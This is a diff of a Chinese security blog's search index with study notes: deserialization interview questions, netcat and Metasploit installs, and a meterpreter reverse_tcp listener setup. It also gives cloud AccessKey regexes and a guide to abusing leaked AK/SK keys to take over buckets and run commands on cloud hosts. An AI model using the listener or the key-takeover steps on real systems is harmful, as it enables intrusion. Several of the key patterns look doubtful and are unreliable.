+    <content><![CDATA[<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><h4 id="classloader是什么"><a href="#classloader是什么" class="headerlink" title="classloader是什么"></a>classloader是什么</h4><p>classloader是java动态类加载机制，在java中类加载分为加载，连接，初始化，classloader是负责加载和连接的，加载器可以根据需要动态的加载类，使得程序在运行时可以动态的扩展，无需在编译时将所有的类都加载进来</p>
+<p>classloader实现了一种双亲委派模型，</p>
+<p><strong>四种类加载器</strong></p>
+<p>BootStrapClassLoader系统类根类加载器  加载 核心类库里面的类   java.lang包</p>
+<p>PlatformClassLoader 平台类加载器  加载核心类库里面的一些类</p>
+<p>AppClassLoader系统类加载器  加载的是自己编写的类</p>
+<p>自定义类加载器  加载网络环境下的类</p>
+<h6 id="加载自定义classloader的前提是什么"><a href="#加载自定义classloader的前提是什么" class="headerlink" title="加载自定义classloader的前提是什么"></a>加载自定义classloader的前提是什么</h6><p>加载自定义ClassLoader的前提是需要一个已经存在的ClassLoader。因为ClassLoader本身也是一个Java类，它也需要被加载和实例化。在Java中，所有的ClassLoader都是由其他ClassLoader加载的，最终都会由Bootstrap ClassLoader(系统根类加载器)加载。</p>
+<h6 id="调用类的四种方法"><a href="#调用类的四种方法" class="headerlink" title="调用类的四种方法"></a>调用类的四种方法</h6><p>类.class</p>
+<p>类.getClass()</p>
+<p>Class.forName(“类”) </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">class&lt;?&gt; c = cl.loadclass(&quot;类&quot;)</span><br></pre></td></tr></table></figure>
+
+<h6 id="fastjson的反序列化和普通反序列化漏洞的区别是什么"><a href="#fastjson的反序列化和普通反序列化漏洞的区别是什么" class="headerlink" title="fastjson的反序列化和普通反序列化漏洞的区别是什么?"></a>fastjson的反序列化和普通反序列化漏洞的区别是什么?</h6><p>普通的反序列化漏洞通常是针对Java对象序列化&#x2F;反序列化机制的漏洞，攻击者可以构造恶意的序列化数据，使得反序列化时执行恶意代码，从而实现攻击。而Fastjson的特性是支持反序列化时自动类型识别和类型转换，这为攻击者提供了构造<strong>恶意JSON字符串</strong>的机会。</p>
+<p><strong>大概讲一下CommonCollections1的利用链，该利用链有什么样的限制?</strong></p>
+<p><strong>在tomcat中实现内存马有哪些方式，有办法实现重启之后依然不会消失的内存马吗?</strong><br><strong>单向代码执行链如何实现执行多条语句，如CommonCollections1</strong> </p>
+<p><strong>请简单讲述一下Shiro反序列化漏洞的原理，无法使用ysoerial中common-collections利用链的原因是什么?</strong> </p>
+<p>ct蓝中</p>
 <p>SQL注入的类型,  报错注入函数三个，主流防御sql注入的方式</p>
+<p> 报错函数  Polygon，GeometryCollection，MultiPoint，MultiLineString</p>
 <p>中间件漏洞讲一下，weblogic，log4j，shiro,fastjson特征   jndi的攻击复现过没有，具体的细节是什么<br>监控的时候怎么区分扫描器和真实攻击ip<br>护网的时候用过什么设备<br>内网了解吗，xxx工具用过没</p>
 <p>告警出现dns隐匿隧道，dns隐匿隧道如何区分，是不是误报  ，dns隧道和常规的dns解析有什么区别<br>ps：金融的一些内网流量可以dns解析出去，但是ping不通</p>
 <p>落地的wabshell怎么开展工作，排查工具有什么<br>怎么排查自启动项</p>
@@ -1345,23 +1562,14 @@
   <entry>
     <title>各种软件的安装</title>
     <url>/2023/07/14/%E5%AE%89%E8%A3%85%E5%90%84%E7%A7%8D%E8%BD%AF%E4%BB%B6/</url>
-    <content><![CDATA[<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h6 id="less"><a href="#less" class="headerlink" title="less"></a>less</h6><p>less和more类似,但是使用less可以随意浏览文件,而more仅能向前移动,却不能向后移动,more启动时会加载整个文件。而且less在查看之前不会加载整个文件  </p>
-<h6 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h6><p>用来处理文本，将文本按照指定的格式输出。其中包含了变量，循环以及数组</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]#awk -F: &#x27;&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line">root</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">adm</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<h6 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h6><p>进去容器中</p>
-<p>docker exec -it  <id> &#x2F;bin&#x2F;bash</p>
-<h6 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h6><p>-sn   基础主机发现</p>
-<p>-sc  默认脚本</p>
-<p>–script&#x3D;vuln 脚本扫描    脚本路径在&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts</p>
-<p>– ssl-enum-ciphers    ssl版本漏洞</p>
-<p>-pn &#x2F;-p0   无ping扫描</p>
-<h3 id="unzip安装"><a href="#unzip安装" class="headerlink" title="unzip安装"></a>unzip安装</h3><p>sudo wget <a href="http://downloads.sourceforge.net/infozip/unzip552.tar.gz">http://downloads.sourceforge.net/infozip/unzip552.tar.gz</a></p>
+    <content><![CDATA[<h3 id="unzip安装"><a href="#unzip安装" class="headerlink" title="unzip安装"></a>unzip安装</h3><p>sudo wget <a href="http://downloads.sourceforge.net/infozip/unzip552.tar.gz">http://downloads.sourceforge.net/infozip/unzip552.tar.gz</a></p>
 <p>tar -zxvf unzip552.tar.gz</p>
 <p>cd unzip-5.52&#x2F;</p>
 <p>cp unix&#x2F;Makefile .&#x2F;</p>
 <p>make generic</p>
 <p>sudo make install</p>
+<h3 id="NETCAT安装"><a href="#NETCAT安装" class="headerlink" title="NETCAT安装"></a>NETCAT安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install nc</span><br><span class="line">apt-get install netcat</span><br><span class="line"></span><br><span class="line">    -g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</span><br><span class="line">    -G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</span><br><span class="line">    -h 在线帮助。</span><br><span class="line">    -i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</span><br><span class="line">    -l 使用监听模式，管控传入的资料。</span><br><span class="line">    -n 直接使用IP地址，而不通过域名服务器。</span><br><span class="line">    -o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</span><br><span class="line">    -p&lt;通信端口&gt; 设置本地主机使用的通信端口。</span><br><span class="line">    -r 乱数指定本地与远端主机的通信端口。</span><br><span class="line">    -s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。</span><br><span class="line">    -u 使用UDP传输协议。</span><br><span class="line">    -v 显示指令执行过程。</span><br><span class="line">    -w&lt;超时秒数&gt; 设置等待连线的时间。</span><br><span class="line">    -z 使用0输入/输出模式，只在扫描通信端口时使用。</span><br></pre></td></tr></table></figure>
+
 <h3 id="redis可视化管理工具"><a href="#redis可视化管理工具" class="headerlink" title="redis可视化管理工具"></a>redis可视化管理工具</h3><p><a href="https://github.com/qishibo/AnotherRedisDesktopManager/releases">https://github.com/qishibo/AnotherRedisDesktopManager/releases</a></p>
 <h3 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h3><h4 id="1-2-安装docker"><a href="#1-2-安装docker" class="headerlink" title="1.2.安装docker"></a>1.2.安装docker</h4><p>安装yum工具</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils \</span><br><span class="line">           device-mapper-persistent-data \</span><br><span class="line">           lvm2 --skip-broken</span><br></pre></td></tr></table></figure>
@@ -1404,11 +1612,14 @@
 <p>3.修改模板文件的引入函数</p>
 <p>4.phantomjs.exe nodejs_server_md5.js</p>
 <p>5.bp插件点连接</p>
+<h3 id="msf安装"><a href="#msf安装" class="headerlink" title="msf安装"></a>msf安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. sudo apt update</span><br><span class="line">2. sudo apt install curl gpg ruby -y</span><br><span class="line">3. curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; <span class="built_in">chmod</span> 755 msfinstall</span><br><span class="line">4. sudo ./msfinstall</span><br><span class="line">5. sudo msfdb init</span><br><span class="line">6. msfconsole</span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="JDK安装"><a href="#JDK安装" class="headerlink" title="JDK安装"></a>JDK安装</h3><p>华为云镜像<a href="https://repo.huaweicloud.com/java/jdk/8u151-b12/">https://repo.huaweicloud.com/java/jdk/8u151-b12/</a></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /usr/local/java    <span class="comment">#创建java目录</span></span><br><span class="line"><span class="built_in">cd</span> /usr/local/java</span><br><span class="line">tar -zxvf jdk-8u151-linux-x64.tar.gz</span><br><span class="line"></span><br><span class="line">vim /etc/profile    <span class="comment">#配置环境变量</span></span><br><span class="line"></span><br><span class="line">  JAVA_HOME=/usr/local/java/jdk1.8.0_151</span><br><span class="line">  CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</span><br><span class="line">  PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line">  <span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/:/opt/jvm/jdk1.8.0_151/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
 
-
-
+<h3 id="maven安装"><a href="#maven安装" class="headerlink" title="maven安装"></a>maven安装</h3><p><a href="https://blog.csdn.net/weixin_42601136/article/details/108588152">https://blog.csdn.net/weixin_42601136/article/details/108588152</a></p>
 <h3 id="tomcat安装"><a href="#tomcat安装" class="headerlink" title="tomcat安装"></a>tomcat安装</h3><p><a href="https://dlcdn.apache.org/tomcat/tomcat-8/v8.5.87/bin/apache-tomcat-8.5.87.tar.gz">https://dlcdn.apache.org/tomcat/tomcat-8/v8.5.87/bin/apache-tomcat-8.5.87.tar.gz</a></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/tomcat</span><br><span class="line">tar -xzvf apache-tomcat-8.5.87.tar.gz  <span class="comment">#解压</span></span><br><span class="line">vi /etc/profile <span class="comment">#编辑环境变量</span></span><br><span class="line">  	<span class="built_in">export</span> TOMCAT_HOME=/usr/local/tomcat/apache-tomcat-8.5.87</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="built_in">cd</span> /usr/local/tomcat/apache-tomcat-8.5.87/conf <span class="comment">#修改tomcat端口，避免冲突</span></span><br><span class="line">vim server.xml</span><br><span class="line">	&lt;Connector port=<span class="string">&quot;8888&quot;</span> protocol=<span class="string">&quot;HTTP/1.1&quot;</span> connectionTimeout=<span class="string">&quot;20000&quot;</span> redirectPort=<span class="string">&quot;8443&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /usr/local/tomcat/apache-tomcat-8.5.87/bin</span><br><span class="line">sh startup.sh</span><br></pre></td></tr></table></figure>
 
@@ -1432,7 +1643,22 @@
 <p>google语法   exploit-db.com&#x2F;google-hacking-database     intitle:index.of “parent directory”</p>
 <p>微信小程序   各种口语化词汇都可以    xx旗下  xx公司集团   </p>
 <p>站长之家–备案查询</p>
+<h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p><strong>案例1</strong>：官网直接的JSON文档，里面直接有Mssql的明文账号密码，ip还是外网的。</p>
+<p><strong>案例2</strong>：使用burpsuite抓包，js源码中存在某云的AK&#x2F;SK。</p>
+<p><strong>案例3</strong>：对apk脱壳，反编译Java代码找到了某云的AK&#x2F;SK。</p>
+<p><strong>案例4</strong>：对apk直接批量进行信息提取，找到了很多偏门的ip+端口的资产。</p>
+<p><strong>案例5</strong>：网站的说明文档中会有一些意外的资产，然后用shiro反序列化、log4j2等常规漏洞可以打进去。</p>
+<p><strong>案例6</strong>：官网链接的软件包中，配置文件含有Socks5代理，直连内网。</p>
+<p><strong>案例7</strong>：SVN等源码泄露漏洞，通过php代码审计上传漏洞</p>
+<p><strong>案例8</strong>：百度网盘搜索方法，对敏感关键词进行检索，成功发现一个员工离职交接文档的压缩包，解压后1G多，里面存放了大量的网络拓扑图及通讯录信息，对后渗透了解网络架构起到了很大帮助</p>
 <p>网站截图工具EyeWitness</p>
+<p>burp插件</p>
+<p>apikit</p>
+<p>burp bounty pro  漏扫工具</p>
+<p>web batchrequest 批量探测存活</p>
+<p>auto repeater</p>
+<p>hae</p>
+<p>onescan  和apikit差不多，可以自定义未授权路径</p>
 ]]></content>
   </entry>
   <entry>
@@ -1453,7 +1679,7 @@
 <p>-w 程序运行不显示窗口</p>
 <p>–icon是图标</p>
 <p>msf开启监听</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.151.171    </span><br><span class="line">set lport 2333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.0.122   </span><br><span class="line">set lport 2333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
 ]]></content>
   </entry>
@@ -1672,6 +1898,7 @@
 </blockquote>
 <p>443&#x2F;80、9558端口（使用辅助工具必须开放此端口）</p>
 <h3 id="常用扫描策略"><a href="#常用扫描策略" class="headerlink" title="常用扫描策略"></a>常用扫描策略</h3><h4 id="降低对业务的影响"><a href="#降低对业务的影响" class="headerlink" title="降低对业务的影响"></a>降低对业务的影响</h4><p>，使用默认策略，默认三小时，3500w分钟以下，syn扫描，connet连接较慢，UA请求头，cookie,url小于3w，站点小于2000，主机小于2000，减少收集最大连接数，关闭模拟浏览器渲染，关闭允许爬父目录，只扫描严重和高危漏洞，可通过标签筛选，hw一般使用原理扫描插件</p>
+<p>三小时</p>
 <h5 id="提升效率的方法"><a href="#提升效率的方法" class="headerlink" title="提升效率的方法"></a>提升效率的方法</h5><p>高效扫描，增加并发，降低子域名深度</p>
 <p>关闭跳过不存活主机，使用默认端口组扫描，对存在的主机进行全端口扫描</p>
 <p>漏洞详情-漏洞复测</p>
@@ -1680,10 +1907,153 @@
 <p>生成任务，漏洞，资产，基线报表，默认模板只会生成漏洞权重大于50%的漏洞</p>
 <p>报表导出，服务2w，端口2000，url3w，漏洞5w</p>
 <h5 id="系统管理功能简介"><a href="#系统管理功能简介" class="headerlink" title="系统管理功能简介"></a>系统管理功能简介</h5><p>引擎管理，状态监控，用户管理，角色权限管理</p>
+<h1 id="万象——日志"><a href="#万象——日志" class="headerlink" title="万象——日志"></a>万象——日志</h1><p>原始日志，安全日志，安全告警</p>
+<h2 id="日志检索"><a href="#日志检索" class="headerlink" title="日志检索"></a>日志检索</h2><p>全文检索，快速全量，条件筛选，高级筛选</p>
+<p>语句and，or，%like%模糊匹配，where</p>
+<p>ip资产，应用资产</p>
+<h3 id="日志展示"><a href="#日志展示" class="headerlink" title="日志展示"></a>日志展示</h3><p>列表模式</p>
+<p>概览模式</p>
+<h3 id="解码工具"><a href="#解码工具" class="headerlink" title="解码工具"></a>解码工具</h3><h3 id="事件调查"><a href="#事件调查" class="headerlink" title="事件调查"></a>事件调查</h3><h2 id="调查-amp-告警"><a href="#调查-amp-告警" class="headerlink" title="调查&amp;告警"></a>调查&amp;告警</h2><p>关联分析-编写规则</p>
+<h1 id="牧云"><a href="#牧云" class="headerlink" title="牧云"></a>牧云</h1><p>探针安装cpu不超过20%，内存不超过500mb</p>
+<p>利用资产清点</p>
 ]]></content>
       <tags>
         <tag>设备</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>AccessKey特征</title>
+    <url>/2023/07/24/AccessKey%E7%89%B9%E5%BE%81/</url>
+    <content><![CDATA[<h2 id="1-1-Google-Cloud"><a href="#1-1-Google-Cloud" class="headerlink" title="1.1 Google Cloud"></a>1.1 Google Cloud</h2><p>Google Cloud Platform (GCP) 的 Access Key 开头标识一般是 “GOOG”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^GOOG[\w\W]&#123;10,30&#125;$</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>服务账号的JSON文件中包含了Access Key和密钥的信息，其中Access Key为<code>client_email</code>，其长度不固定，由字母、数字和特殊字符组成。</li>
+<li>密钥（Key）的长度为256个字符，由字母、数字和特殊字符组成。</li>
+</ul>
+<h2 id="1-2-Microsoft-Azure"><a href="#1-2-Microsoft-Azure" class="headerlink" title="1.2 Microsoft Azure"></a>1.2 Microsoft Azure</h2><p>Microsoft Azure 的 Access Key 开头标识一般是 “AZ”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^AZ[A-Za-z0-9]&#123;34,40&#125;$</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Azure AD Application的Client ID通常用作Access Key，长度为36个字符，由字母和数字组成。</li>
+<li>对于Azure AD Application的密钥（Secret），长度为44个字符，由字母、数字和特殊字符组成。</li>
+</ul>
+<h2 id="1-3-腾讯云"><a href="#1-3-腾讯云" class="headerlink" title="1.3 腾讯云"></a>1.3 腾讯云</h2><p>腾讯云 (Tencent Cloud) 的 Access Key 开头标识一般是 “AKID”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^AKID[A-Za-z0-9]&#123;13,20&#125;$</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>SecretId长度为17个字符，由字母和数字组成。</li>
+<li>SecretKey长度为40个字符，由字母和数字组成。</li>
+</ul>
+<h2 id="1-4-亚马逊云"><a href="#1-4-亚马逊云" class="headerlink" title="1.4 亚马逊云"></a>1.4 亚马逊云</h2><p>亚马逊云计算服务 (Amazon Web Services, AWS) 的 Access Key 开头标识一般是 “AKIA”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^AKIA[A-Za-z0-9]&#123;16&#125;$</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Access Key ID: 20 random uppercase alphanumeric characters like AKHDNAPO86BSHKDIRYTE</li>
+<li>Secret access key ID: 40 random upper and lowercase characters: S836fh&#x2F;J73yHSb64Ag3Rkdi&#x2F;jaD6sPl6&#x2F;antFtU (It’s not possible to retrieve lost secret access key IDs).</li>
+</ul>
+<h2 id="1-5-IBM-Cloud"><a href="#1-5-IBM-Cloud" class="headerlink" title="1.5 IBM Cloud"></a>1.5 IBM Cloud</h2><p>IBM云 (IBM Cloud) 的 Access Key 开头标识一般是 “IBM”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^IBM[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-6-Oracle-Cloud"><a href="#1-6-Oracle-Cloud" class="headerlink" title="1.6 Oracle Cloud"></a>1.6 Oracle Cloud</h2><p>Oracle云 (Oracle Cloud) 的 Access Key 开头标识一般是 “OCID”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^OCID[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-7-阿里云"><a href="#1-7-阿里云" class="headerlink" title="1.7 阿里云"></a>1.7 阿里云</h2><p>阿里云 (Alibaba Cloud) 的 Access Key 开头标识一般是 “LTAI”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^LTAI[A-Za-z0-9]&#123;12,20&#125;$</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Access Key ID长度为16-24个字符，由大写字母和数字组成。</li>
+<li>Access Key Secret长度为30个字符，由大写字母、小写字母和数字组成。</li>
+</ul>
+<h2 id="1-8-华为云"><a href="#1-8-华为云" class="headerlink" title="1.8 华为云"></a>1.8 华为云</h2><p>华为云 (Huawei Cloud) 的 Access Key 开头标识一般是 “AK”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^AK[\w\W]&#123;10,62&#125;$</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Access Key ID长度为64个字符，由字母、数字和特殊字符组成。</li>
+<li>Secret Access Key长度为44个字符，由字母、数字和特殊字符组成。</li>
+</ul>
+<h2 id="1-9-百度云"><a href="#1-9-百度云" class="headerlink" title="1.9 百度云"></a>1.9 百度云</h2><p>百度云 (Baidu Cloud) 的 Access Key 开头标识一般是 “AK”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^AK[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-10-京东云"><a href="#1-10-京东云" class="headerlink" title="1.10 京东云"></a>1.10 京东云</h2><p>京东云 (JD Cloud) 的 Access Key 开头标识一般是 “AK”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^AK[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-11-UCloud"><a href="#1-11-UCloud" class="headerlink" title="1.11 UCloud"></a>1.11 UCloud</h2><p>UCloud (UCloud) 的 Access Key 开头标识一般是 “UC”</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^UC[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-12-青云"><a href="#1-12-青云" class="headerlink" title="1.12 青云"></a>1.12 青云</h2><p>青云 (QingCloud) 的 Access Key 开头标识一般是 “QY”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^QY[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-13-金山云"><a href="#1-13-金山云" class="headerlink" title="1.13 金山云"></a>1.13 金山云</h2><p>金山云 (Kingsoft Cloud) 的 Access Key 开头标识一般是 “KS3”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^KS3[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-14-联通云"><a href="#1-14-联通云" class="headerlink" title="1.14 联通云"></a>1.14 联通云</h2><p>联通云 (China Unicom Cloud) 的 Access Key 开头标识一般是 “LTC”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^LTC[A-Za-z0-9]&#123;10,60&#125;$</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-15-移动云"><a href="#1-15-移动云" class="headerlink" title="1.15 移动云"></a>1.15 移动云</h2><p>移动云 (China Mobile Cloud) 的 Access Key 开头标识一般是 “YD”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^YD[A-Za-z0-9]&#123;10,60&#125;$</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-6-电信云"><a href="#1-6-电信云" class="headerlink" title="1.6 电信云"></a>1.6 电信云</h2><p>中国电信云 (China Telecom Cloud) 的 Access Key 开头标识一般是 “CTC”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^CTC[A-Za-z0-9]&#123;10,60&#125;$</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-17-一云通"><a href="#1-17-一云通" class="headerlink" title="1.17 一云通"></a>1.17 一云通</h2><p>一云通 (Yonyou Cloud) 的 Access Key 开头标识一般是 “YYT”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^YYT[A-Za-z0-9]&#123;10,60&#125;$</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-18-用友云"><a href="#1-18-用友云" class="headerlink" title="1.18 用友云"></a>1.18 用友云</h2><p>用友云 (Yonyou Cloud) 的 Access Key 开头标识一般是 “YY”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^YY[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-19-南大通用云"><a href="#1-19-南大通用云" class="headerlink" title="1.19 南大通用云"></a>1.19 南大通用云</h2><p>南大通用云 (OUCDC) 的 Access Key 开头标识一般是 “CI”。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^CI[A-Za-z0-9]&#123;10,40&#125;$</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-20-G-Core-Labs"><a href="#1-20-G-Core-Labs" class="headerlink" title="1.20 G-Core Labs"></a>1.20 G-Core Labs</h2><p>G-Core Labs 的 Access Key 开头标识一般是 “gcore”</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^gcore[A-Za-z0-9]&#123;10,30&#125;$</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>特征</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/07/26/aksk%E6%B3%84%E9%9C%B2%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<hr>
+<hr>
+<h2 id="spring-actuator-heapdump文件造成的密钥泄露"><a href="#spring-actuator-heapdump文件造成的密钥泄露" class="headerlink" title="spring actuator heapdump文件造成的密钥泄露"></a>spring actuator heapdump文件造成的密钥泄露</h2><p>访问网站发现spring未授权，此时查看是否有heapdump文件，下载解压，全局搜索可发现密钥泄露</p>
+<p>扫描工具：<a href="https://github.com/F6JO/RouteVulScan">https://github.com/F6JO/RouteVulScan</a></p>
+<p>解压工具：<a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></p>
+<h3 id="爆破文件路径"><a href="#爆破文件路径" class="headerlink" title="爆破文件路径"></a>爆破文件路径</h3><p>文件存储位置会有一些敏感文件泄露，比如下载云服务器上某文件时抓包分析，可以再请求的位置爆破文件名，云服务器会返回带有访问密钥的敏感文件</p>
+<p>得到文件地址后访问下载，</p>
+<p>工具链接：<a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></p>
+<h3 id="js文件泄露秘钥"><a href="#js文件泄露秘钥" class="headerlink" title="js文件泄露秘钥"></a>js文件泄露秘钥</h3><p>谷歌扩展trufflehog，会在findings位置显示是否有秘钥泄露</p>
+<h3 id="小程序上传等功能点泄露"><a href="#小程序上传等功能点泄露" class="headerlink" title="小程序上传等功能点泄露"></a>小程序上传等功能点泄露</h3><p>谋小程序打开后点击个人中心头像抓包，返回头中包含aksk</p>
+<h3 id="配置信息的aksk泄露"><a href="#配置信息的aksk泄露" class="headerlink" title="配置信息的aksk泄露"></a>配置信息的aksk泄露</h3><p>常见的nacos后台的配置列表，打开示例可以看到一些配置信息，可以看到有aksk泄露</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="aksk接管存储桶"><a href="#aksk接管存储桶" class="headerlink" title="aksk接管存储桶"></a>aksk接管存储桶</h3><p><strong>OSS Browser–阿里云官方提供的OSS图形化管理工具</strong></p>
+<p><a href="https://github.com/aliyun/oss-browser">https://github.com/aliyun/oss-browser</a></p>
+<p><strong>腾讯云云主机接管平台：</strong></p>
+<p><a href="https://cosbrowser.cloud.tencent.com/web/bucket">https://cosbrowser.cloud.tencent.com/web/bucket</a></p>
+<p><strong>行云管家（支持多家云主机厂商</strong></p>
+<p><a href="https://yun.cloudbility.com/">https://yun.cloudbility.com</a></p>
+<p><strong>cf云环境利用框架</strong></p>
+<p><a href="https://github.com/teamssix/cf/releases">https://github.com/teamssix/cf/releases</a></p>
+<p><strong>针对阿里云主机rce</strong></p>
+<p>工具链接：<a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a></p>
+<p>输入ak\sk查询主机，选择主机名填入，查看云助手列表是true或者false，为true可执行命令。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>导出谷歌浏览器插件</title>
+    <url>/2023/07/26/%E5%AF%BC%E5%87%BA%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6/</url>
+    <content><![CDATA[<p>打开扩展程序的开发者模式</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230726112826076.png" alt="image-20230726112826076"></p>
+<p>记下这个id，在目录C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Extensions里面找到这个id命名的文件夹，然后点击打包扩展程序</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230726112938985.png" alt="image-20230726112938985"></p>
+<p>浏览中选择刚才的文件夹，点击打包扩展程序，</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230726113025083.png" alt="image-20230726113025083"></p>
+<p>打包好crx格式的文件，拖到其他人的谷歌浏览器直接安装就好了</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/07/24/%E6%BC%94%E7%A4%BA/Untitled/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1734,6 +2104,114 @@
